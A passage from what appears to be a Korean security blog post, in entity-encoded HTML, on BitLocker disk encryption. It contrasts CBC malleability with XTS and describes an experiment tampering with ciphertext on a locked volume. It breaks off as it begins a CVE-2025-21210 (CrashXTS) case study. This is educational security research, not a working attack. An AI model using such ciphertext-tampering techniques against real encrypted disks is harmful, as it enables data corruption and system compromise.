&#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image3.png" alt></p><p>Windows 11&#xBD80;&#xD130; BitLocker&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xAE30;&#xC874;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB358; AES-CBC &#xB300;&#xC2E0; AES-XTS&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; CBC &#xC554;&#xD638;&#xD654; &#xBC29;&#xC2DD;&#xC5D0;&#xC11C; &#xAD6C;&#xC870;&#xC801;&#xC73C;&#xB85C; &#xC0DD;&#xAE38; &#xC218; &#xC788;&#xB294; attack surface&#xB97C; &#xC904;&#xC774;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image4.png" alt></p><script type="math/tex; mode=display">C_i = E_K\!\left(P_i \oplus C_{i-1}\right)</script><script type="math/tex; mode=display">P_i = D_K\!\left(C_i\right) \oplus C_{i-1}</script><p>CBC &#xC554;&#xD638;&#xD654; &#xBC29;&#xC2DD;&#xC740; &#xC6B0;&#xB9AC;&#xC5D0;&#xAC8C; &#xC775;&#xC219;&#xD55C; &#xC554;&#xD638;&#xD654; &#xBC29;&#xC2DD;&#xC774;&#xC8E0;? CBC &#xC554;&#xD638;&#xD654; &#xBC29;&#xC2DD;&#xC740; &#xBE14;&#xB85D; &#xC554;&#xD638;&#xC778; AES&#xB97C; &#xCCB4;&#xC778;&#xCC98;&#xB7FC; &#xC5EE;&#xB294; &#xBC29;&#xC2DD;&#xC778;&#xB370;, CBC &#xBC29;&#xC2DD;&#xC774; &#xB514;&#xC2A4;&#xD06C; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xB418;&#xB294; &#xD3EC;&#xC778;&#xD2B8;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><strong>&#xC5F0;&#xC1C4; &#xAD6C;&#xC870; (Chaining Dependency)</strong><br>CBC&#xB294; &#xBCF8;&#xC9C8;&#xC801;&#xC73C;&#xB85C; &#xC55E; &#xBE14;&#xB85D;&#xC774; &#xB4A4; &#xBE14;&#xB85D;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xB514;&#xC2A4;&#xD06C;&#xCC98;&#xB7FC; &#xC911;&#xAC04; &#xBE14;&#xB85D;&#xB9CC; &#xBC14;&#xAFD4; &#xC4F0;&#xB294; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xAC00; &#xAE4C;&#xB2E4;&#xB86D;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB514;&#xC2A4;&#xD06C;&#xB294; &#xD30C;&#xC77C; &#xC77C;&#xBD80;&#xB9CC; &#xAC31;&#xC2E0;&#xB418;&#xAE30;&#xB3C4; &#xD558;&#xACE0;, OS&#xAC00; &#xD2B9;&#xC815; &#xC139;&#xD130;&#xB9CC; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. &#xC139;&#xD130; &#xB2E8;&#xC704;&#xB85C; &#xB3C5;&#xB9BD;&#xC801;&#xC778; &#xC554;&#xBCF5;&#xD638;&#xD654;&#xAC00; &#xBD88;&#xAC00;&#xB2A5;&#xD574; &#xC131;&#xB2A5; &#xC800;&#xD558;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xBE44;&#xD2B8; &#xD50C;&#xB9BD; &#xACF5;&#xACA9; (Bit Flipping)</strong><br>CBC &#xBCF5;&#xD638; &#xC2DD;&#xC5D0;&#xC11C; &#xBCF4;&#xB4EF;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD2B9;&#xC815; &#xBE44;&#xD2B8;&#xB97C; &#xB4A4;&#xC9D1;&#xC73C;&#xBA74; &#xB3D9;&#xC77C;&#xD55C; &#xC704;&#xCE58; &#xBE44;&#xD2B8;&#xAC00; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB4A4;&#xC9D1;&#xD799;&#xB2C8;&#xB2E4;. &#xC989;, &#xC554;&#xD638;&#xBB38;&#xC744; &#xC870;&#xC791;&#xD574; &#xD3C9;&#xBB38;&#xC744; &#xC608;&#xCE21; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>IV(Initialization Vector) &#xAD00;&#xB9AC; &#xBB38;&#xC81C;</strong><br>&#xAC01; &#xC139;&#xD130;&#xB9C8;&#xB2E4; &#xACE0;&#xC720;&#xD55C; IV&#xAC00; &#xD544;&#xC694;&#xD558;&#xC9C0;&#xB9CC;, IV&#xB97C; &#xC139;&#xD130; &#xBC88;&#xD638;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC608;&#xCE21; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC0DD;&#xAE30;&#xACE0;, &#xB79C;&#xB364; IV&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xCD94;&#xAC00; &#xC800;&#xC7A5; &#xACF5;&#xAC04;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC774;&#xC640; &#xAC19;&#xC740; &#xD750;&#xB984;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCFC; &#xB54C;, &#xACFC;&#xAC70; CBC &#xAE30;&#xBC18; FDE&#xC5D0;&#xC11C;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB514;&#xC2A4;&#xD06C; &#xC0C1;&#xC758; &#xC554;&#xD638;&#xBB38;&#xC744; &#xBE44;&#xD2B8; &#xB2E8;&#xC704;&#xB85C; &#xC218;&#xC815;&#xD574; &#xBD80;&#xD2B8;&#xB85C;&#xB354;&#xB098; &#xC6B4;&#xC601;&#xCCB4;&#xC81C; &#xCF54;&#xB4DC;&#xC5D0; &#xC545;&#xC131; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC774;&#xB860;&#xC801;&#xC73C;&#xB85C; &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image5.png" alt></p><p>&#xB530;&#xB77C;&#xC11C; &#xADF8;&#xAC04; CBC &#xBAA8;&#xB4DC;&#xC758; &#xAD6C;&#xC870;&#xC801; &#xCDE8;&#xC57D;&#xC810;&#xC778; &#xAC00;&#xB2E8;&#xC131;(Malleability)&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC554;&#xD638;&#xD654;&#xB41C; &#xBD80;&#xD2B8; &#xC139;&#xD130;&#xB098; OS &#xC911;&#xC694; &#xD30C;&#xC77C;&#xC774; &#xBCC0;&#xC870;&#xB420; &#xC704;&#xD5D8;&#xC774; &#xC81C;&#xAE30;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC5D0; &#xB530;&#xB77C; 2008&#xB144; TrueCrypt 5.0&#xC774; <strong>XTS-AES</strong>&#xB97C; &#xB3C4;&#xC785;&#xD588;&#xACE0;, &#xC774;&#xD6C4; Microsoft &#xC5ED;&#xC2DC; Windows 10&#xBD80;&#xD130; BitLocker&#xC758; &#xAE30;&#xBCF8; &#xC554;&#xD638;&#xD654; &#xD45C;&#xC900;&#xC73C;&#xB85C; XTS-AES&#xB97C; &#xCC44;&#xD0DD;&#xD558;&#xC5EC; &#xC774;&#xB7EC;&#xD55C; &#xC704;&#xD611;&#xC5D0; &#xB300;&#xC751;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xC774;&#xB7EC;&#xD55C; XTS &#xC554;&#xD638;&#xBB38; &#xBAA8;&#xB4DC;&#xC758; &#xC758; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;&#xC744; &#xD55C;&#xBC88; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; XTS&#xB294; &#xBE14;&#xB85D;&#xB9C8;&#xB2E4; tweak&#xB77C;&#xB294; &#xAC12;&#xC744; &#xC50C;&#xC6C1;&#xB2C8;&#xB2E4;. &#xC774; tweak&#xB77C;&#xB294; &#xAC12;&#xC740; &#x2018;&#xB514;&#xC2A4;&#xD06C; &#xC704;&#xCE58;&#x2019;&#xC5D0;&#xC11C; &#xACB0;&#xC815;&#xB418;&#xB294; &#xB09C;&#xC218; &#xAC12;&#xC774;&#xBA70;, &#xC774; &#xAC12;&#xC740; &#xBCF4;&#xD1B5; &#xC139;&#xD130; &#xBC88;&#xD638;&#xC640; &#xC139;&#xD130; &#xB0B4; &#xBE14;&#xB85D; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC815;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;. &#xB514;&#xC2A4;&#xD06C;&#xB294; 512B(4KB)&#xAC19;&#xC740; &#xD06C;&#xAE30;&#xC758; &#xC139;&#xD130;&#xB85C; &#xC77D;&#xACE0; &#xC4F0;&#xACE0;, AES&#xB294; 16B &#xBE14;&#xB85D;&#xC774;&#xBBC0;&#xB85C; &#xC608;&#xB97C;&#xB4E4;&#xBA74; 512B &#xAE30;&#xC900;&#xC73C;&#xB85C; 32&#xAC1C;&#xB85C; &#xBE14;&#xB85D;&#xC774; &#xB098;&#xB258;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC989;, XTS&#xB294; &#xC774; 16B &#xBE14;&#xB85D;&#xB9C8;&#xB2E4; &#xC11C;&#xB85C; &#xB2E4;&#xB978; tweak&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB429;&#xB2C8;&#xB2E4;.</p><script type="math/tex; mode=display">T_i = \mathrm{Tweak}_{K_2}(s, j)</script><script type="math/tex; mode=display">C_i = E_{K_1}\!\left(P_i \oplus T_i\right) \oplus T_i</script><p>XTS&#xB294; Key&#xB97C; &#xB450; &#xAC1C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. <code>Key1</code>&#xC740; &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC554;&#xD638;&#xD654;&#xC640; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xB294; &#xBAA9;&#xC801;&#xC73C;&#xB85C;, <code>Key2</code>&#xB294; &#xB370;&#xC774;&#xD130;&#xC758; &#xC704;&#xCE58; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xC740; tweak&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xBAA9;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xAC19;&#xC740; XTS &#xBAA8;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD2B9;&#xC815; &#xC554;&#xD638;&#xBB38; &#xBE14;&#xB85D;&#xC744; &#xC870;&#xC791;&#xD574;&#xB3C4;, <strong><em>&#xBE44;&#xC120;&#xD615;&#xC131;</em></strong>&#xC73C;&#xB85C; &#xC778;&#xD574; 16&#xBC14;&#xC774;&#xD2B8; &#xBE14;&#xB85D; &#xB2E8;&#xC704;&#xB85C; &#xACB0;&#xACFC;&#xAC00; &#xC608;&#xCE21; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xBB34;&#xC791;&#xC704;&#xC5D0; &#xAC00;&#xAE4C;&#xC6B4; &#xC190;&#xC0C1;&#xC774; &#xC774;&#xB904;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC989;, CBC&#xCC98;&#xB7FC; &#xBC14;&#xB85C; &#xB2E4;&#xC74C; &#xBE14;&#xB85D;&#xC758; &#xD2B9;&#xC815; &#xBE44;&#xD2B8;&#xB97C; &#xC6D0;&#xD558;&#xB294; &#xAC12;&#xC73C;&#xB85C; &#xBC14;&#xAFB8;&#xAC70;&#xB098; &#xD558;&#xB294; &#xC815;&#xAD50;&#xD55C; &#xC870;&#xC791;&#xC774; &#xC0AC;&#xC2E4;&#xC0C1; &#xBD88;&#xAC00;&#xB2A5;&#xD574;&#xC9C0;&#xB294; &#xAC83;&#xC774;&#xC8E0;.</p><h3 id="2-2-XTS&#xC758;-&#xD574;&#xACB0;&#xB418;&#xC9C0;-&#xBABB;&#xD55C;-&#xACFC;&#xC81C;"><a href="#2-2-XTS&#xC758;-&#xD574;&#xACB0;&#xB418;&#xC9C0;-&#xBABB;&#xD55C;-&#xACFC;&#xC81C;" class="headerlink" title="2.2 XTS&#xC758; &#xD574;&#xACB0;&#xB418;&#xC9C0; &#xBABB;&#xD55C; &#xACFC;&#xC81C;"></a><strong>2.2 XTS&#xC758; &#xD574;&#xACB0;&#xB418;&#xC9C0; &#xBABB;&#xD55C; &#xACFC;&#xC81C;</strong></h3><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image6.png" alt></p><p>&#xADF8;&#xB7EC;&#xB098; XTS&#xB294; &#xC5EC;&#xC804;&#xD788; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xADFC;&#xBCF8;&#xC801;&#xC778; &#xD55C;&#xACC4;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>1. &#xBB34;&#xACB0;&#xC131; &#xBCF4;&#xD638; &#xBD80;&#xC7AC;</strong></p><p>XTS&#xB294; &#xC870;&#xC791; &#xACB0;&#xACFC;&#xB97C; &#xC608;&#xCE21;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4E4;&#xC9C0;&#xB9CC;, &#xC870;&#xC791; &#xC790;&#xCCB4;&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xAC70;&#xB098; &#xAC70;&#xBD80;&#xD558;&#xB294; &#xBB34;&#xACB0;&#xC131; &#xBCF4;&#xD638;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC554;&#xD638;&#xBB38;&#xC744; &#xBC14;&#xAFB8;&#xBA74;, &#xC2DC;&#xC2A4;&#xD15C;&#xC740; &#xADF8; &#xBCC0;&#xC870; &#xC0AC;&#xC2E4;&#xC744; &#xAC10;&#xC9C0;&#xD574;&#xC11C; &#xC911;&#xB2E8;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2DC;&#xC2A4;&#xD15C;&#xC740; &#xC774; &#xBCC0;&#xC870;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xADF8;&#xB0E5; &#xBCF5;&#xD638;&#xD574;&#xC11C; &#xAE68;&#xC9C4; &#xD3C9;&#xBB38;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>2. &#xC138;&#xBD84;&#xD654;&#xB41C; &#xBCC0;&#xC870; &#xD0D0;&#xC9C0;</strong></p><p>XTS&#xB294; &#xC5B4;&#xB5A4; &#xC139;&#xD130;&#xB098; &#xBE14;&#xB85D;&#xC774; &#xBC14;&#xB00C;&#xC5C8;&#xB294;&#xC9C0;&#xC758; &#xBCC0;&#xD654;&#xB97C; &#xBE14;&#xB85D; &#xB2E8;&#xC704;&#xB85C; &#xC815;&#xD655;&#xD788; &#xACA9;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; CBC&#xBCF4;&#xB2E4; &#xC138;&#xBD84;&#xC131;&#xC774; &#xC88B;&#xC544;&#xC11C;, &#xBCC0;&#xD615;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xD2B9;&#xC815; &#xC704;&#xCE58;&#xB97C; &#xD30C;&#xC545;&#xD558;&#xB294; &#xB370; &#xC720;&#xC6A9;&#xD55C; &#xB2E8;&#xC11C;&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC5B4;&#xB5A4; &#xBE14;&#xB85D;&#xC774; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xC804;&#xCCB4; &#xB514;&#xC2A4;&#xD06C; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xC27D;&#xAC8C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>3. Copy-Paste &#xACF5;&#xACA9;</strong></p><p>XTS &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xB3D9;&#xC77C;&#xD55C; &#xD3C9;&#xBB38; &#xBE14;&#xB85D;&#xC740; &#xB3D9;&#xC77C;&#xD55C; &#xC139;&#xD130;&#xC5D0;&#xC11C; &#xD56D;&#xC0C1; &#xB3D9;&#xC77C;&#xD55C; &#xC554;&#xD638;&#xBB38;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xAC19;&#xC740; &#xC139;&#xD130;&#xC758; &#xC774;&#xC804; &#xBC84;&#xC804; &#xC554;&#xD638;&#xBB38;&#xC744; &#xBCF5;&#xC0AC;&#xD574; &#xD604;&#xC7AC; &#xBC84;&#xC804;&#xC744; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xAC70;&#xB098;, &#xB2E4;&#xB978; &#xC139;&#xD130;&#xC758; &#xC554;&#xD638;&#xBB38;&#xC744; &#xBCF5;&#xC0AC;&#xD574; &#xBD99;&#xC5EC;&#xB123;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>4. &#xC881;&#xC740; &#xBE14;&#xB85D; &#xD06C;&#xAE30;</strong></p><p>XTS&#xB294; 16&#xBC14;&#xC774;&#xD2B8; &#xBE14;&#xB85D; &#xB2E8;&#xC704;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xBBC0;&#xB85C;, &#xB3D9;&#xC77C;&#xD55C; 16&#xBC14;&#xC774;&#xD2B8; &#xD3C9;&#xBB38; &#xD328;&#xD134;&#xC774; &#xBC18;&#xBCF5;&#xB418;&#xBA74; &#xC554;&#xD638;&#xBB38;&#xC5D0;&#xC11C;&#xB3C4; &#xD328;&#xD134;&#xC774; &#xAD00;&#xCC30;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC554;&#xD638;&#xBB38; &#xBD84;&#xC11D;&#xC5D0; &#xD65C;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image7.png" alt></p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image8.png" alt></p><p>&#xC774;&#xB97C; &#xC9C1;&#xC811; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xAE30; &#xC704;&#xD574;&#xC11C; BitLocker &#xBCFC;&#xB968;&#xC5D0;&#xC11C; XTS-AES&#xC758; &#xBB34;&#xACB0;&#xC131; &#xBD80;&#xC7AC;&#xB97C; &#xC9C1;&#xAD00;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xB294; &#xC2E4;&#xC2B5;&#xC744; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; BitLocker&#xAC00; &#xC801;&#xC6A9;&#xB41C; &#xBCFC;&#xB968; V:&#xC5D0; 16MiB &#xD06C;&#xAE30; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0;, &#xC0DD;&#xC131; &#xC9C1;&#xD6C4; &#xD30C;&#xC77C;&#xC758; SHA-256 &#xD574;&#xC2DC;&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACE0; &#xC774;&#xB97C; &#xAE30;&#xC900;&#xAC12;&#xC73C;&#xB85C; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xBCFC;&#xB968;&#xC744; &#xC7A0;&#xADFC; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xB514;&#xC2A4;&#xD06C; &#xC6D0;&#xC2DC; &#xC601;&#xC5ED;&#xC744; &#xC9C1;&#xC811; &#xD3B8;&#xC9D1;&#xD574; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; &#xD3EC;&#xD568;&#xB41C; 16&#xBC14;&#xC774;&#xD2B8; &#xB2E8;&#xC704; &#xC554;&#xD638;&#xBB38; &#xBE14;&#xB85D;&#xC744; &#xC77C;&#xBD80; &#xBCC0;&#xC870;&#xD558;&#xACE0;, &#xB2E4;&#xC2DC; &#xBCFC;&#xB968;&#xC744; &#xD574;&#xC81C;&#xD55C; &#xB4A4; &#xB3D9;&#xC77C; &#xD30C;&#xC77C;&#xC758; SHA-256 &#xD574;&#xC2DC;&#xB97C; &#xC7AC;&#xACC4;&#xC0B0;&#xD574; &#xAE30;&#xC900;&#xAC12;&#xACFC; &#xBE44;&#xAD50;&#xD574;&#xBCF4;&#xBA74; &#xD574;&#xC2DC;&#xAC12;&#xC774; &#xBC14;&#xB00C;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image9.png" alt></p><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image10.png" alt></p><p>&#xC554;&#xD638;&#xBB38;&#xC5D0;&#xC11C; &#xB531; 1&#xBE44;&#xD2B8;&#xB9CC; &#xBCC0;&#xACBD;&#xD558;&#xB354;&#xB77C;&#xB3C4;, XTS &#xACB0;&#xACFC;&#xC5D0;&#xC11C; &#xC554;&#xD638;&#xBB38;&#xC744; 1&#xBE44;&#xD2B8;&#xB9CC; &#xBC14;&#xAFE8;&#xC9C0;&#xB9CC; &#xD574;&#xB2F9; 16&#xBC14;&#xC774;&#xD2B8; &#xBE14;&#xB85D; &#xC804;&#xCCB4;&#xAC00; &#xBB34;&#xC791;&#xC704;&#xB85C; randomizing&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB3D9;&#xC2DC;&#xC5D0; &#xC774;&#xB97C; &#xD1B5;&#xD574;, &#xB2E4;&#xB978; &#xC774;&#xC6C3; &#xBE14;&#xB85D;&#xB4E4;&#xC5D0;&#xB294; &#xC601;&#xD5A5;&#xC774; &#xC5C6;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>Windows&#xAC00; AEAD&#xB85C; &#xC804;&#xD658;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xC774;&#xC720;</strong><br>&#xD558;&#xC9C0;&#xB9CC; Windows &#xC785;&#xC7A5;&#xC5D0;&#xC11C;&#xB294; MAC&#xC774;&#xB098; AEAD &#xAC19;&#xC740; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xBD99;&#xC778; &#xD615;&#xD0DC;&#xC758; &#xB514;&#xC2A4;&#xD06C; &#xC554;&#xD638;&#xD654;&#xB85C; &#xC644;&#xC804;&#xD788; &#xB118;&#xC5B4;&#xAC00;&#xAE30;&#xC5D0;&#xB294; &#xD55C;&#xACC4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xB2E8;&#xC21C;&#xD788; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xAD50;&#xCCB4;&#xD558;&#xB294; &#xCC28;&#xC6D0;&#xC744; &#xB118;&#xC5B4;, &#xBD80;&#xD305;&#xBD80;&#xD130; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;, &#xD06C;&#xB798;&#xC2DC; &#xB364;&#xD504;&#xC5D0; &#xC774;&#xB974;&#xB294; &#xC804;&#xCCB4; I/O &#xACBD;&#xB85C;&#xAC00; &#xBB34;&#xACB0;&#xC131; &#xAC80;&#xC99D; &#xC2E4;&#xD328;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC98;&#xB9AC;&#xD560;&#xC9C0; &#xC2DC;&#xC2A4;&#xD15C; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xC804;&#xBA74; &#xC7AC;&#xC124;&#xACC4;&#xD574;&#xC57C; &#xD558;&#xB294; &#xAC70;&#xB300;&#xD55C; &#xC791;&#xC5C5;&#xC774; &#xB3D9;&#xBC18;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC8E0;.. &#xB610;&#xD55C;, &#xBAA8;&#xB4E0; &#xC139;&#xD130;&#xC5D0; MAC &#xD0DC;&#xADF8;&#xB97C; &#xC800;&#xC7A5;&#xD574;&#xC57C; &#xD558;&#xB294; &#xACF5;&#xAC04; &#xD6A8;&#xC728;&#xC131; &#xC800;&#xD558;, I/O &#xC131;&#xB2A5; &#xC624;&#xBC84;&#xD5E4;&#xB4DC; &#xBB38;&#xC81C;&#xB294; &#xBB3C;&#xB860;, &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xBD80;&#xBD84; &#xC4F0;&#xAE30; &#xB3D9;&#xC791;&#xACFC;&#xC758; &#xBD88;&#xC77C;&#xCE58;&#xB97C; &#xD574;&#xACB0;&#xD574;&#xC57C; &#xD558;&#xB294; &#xBB38;&#xC81C;&#xB3C4; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xBB34;&#xC5C7;&#xBCF4;&#xB2E4;&#xB3C4; &#xC791;&#xC740; &#xB370;&#xC774;&#xD130; &#xC190;&#xC0C1;&#xC5D0;&#xB3C4; &#xC5C4;&#xACA9;&#xD55C; &#xAC80;&#xC99D; &#xC2E4;&#xD328;&#xB85C; &#xC778;&#xD574; &#xBCFC;&#xB968; &#xC804;&#xCCB4;&#xC758; &#xB9C8;&#xC6B4;&#xD2B8;&#xAC00; &#xAC70;&#xBD80;&#xB420; &#xC218; &#xC788;&#xB294; &#xAC00;&#xC6A9;&#xC131; &#xC800;&#xD558; &#xC6B0;&#xB824;&#xB85C; &#xC778;&#xD574;&#xC11C; &#xC544;&#xC9C1;&#xAE4C;&#xC9C0;&#xB3C4; &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xC644;&#xC804;&#xD55C; &#xB300;&#xCC45;&#xC744; &#xB9C8;&#xB828;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="2-3-CASE-CVE-2025-21210-CrashXTS"><a href="#2-3-CASE-CVE-2025-21210-CrashXTS" class="headerlink" title="2.3 CASE: CVE-2025-21210 (CrashXTS)"></a>2.3 CASE: CVE-2025-21210 (CrashXTS)</h3><p>&#xAC19;&#xC740; &#xC139;&#xD130;&#xB294; &#xAC19;&#xC740; tweak&#xB85C; &#xC554;&#xD638;&#xD654;&#xB41C;&#xB2E4;&#xB294; XTS&#xC758; &#xC131;&#xC9C8;&#xC740;, &#xAC19;&#xC740; &#xC139;&#xD130; &#xBC88;&#xD638;&#xC640; &#xAC19;&#xC740; FVEK&#xAC00; &#xC8FC;&#xC5B4;&#xC9C0;&#xBA74; &#xAC19;&#xC740; &#xD3C9;&#xBB38;&#xC740; &#xD56D;&#xC0C1; &#xAC19;&#xC740; &#xC554;&#xD638;&#xBB38;&#xC73C;&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xBA70;, &#xBD80;&#xD305;&#xC744; &#xC5EC;&#xB7EC; &#xBC88; &#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC139;&#xD130; &#xBC88;&#xD638;&#xAC00; &#xBC14;&#xB00C;&#xC9C0; &#xC54A;&#xB294; &#xD55C; &#xC554;&#xD638;&#xBB38;&#xC740; &#xC77C;&#xC815;&#xD558;&#xAC8C; &#xC720;&#xC9C0;&#xB429;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; XTS&#xC5D0;&#xC11C; &#xC6B0;&#xB9AC;&#xB294; Write primitive&#xB97C; &#xC5BB;&#xAE30;&#xB294; &#xC5B4;&#xB835;&#xC9C0;&#xB9CC; Corrupt&#xB97C; &#xD1B5;&#xD574; &#xC2DC;&#xC2A4;&#xD15C; &#xB3D9;&#xC791; &#xACBD;&#xB85C; &#xD750;&#xB984;&#xC744; 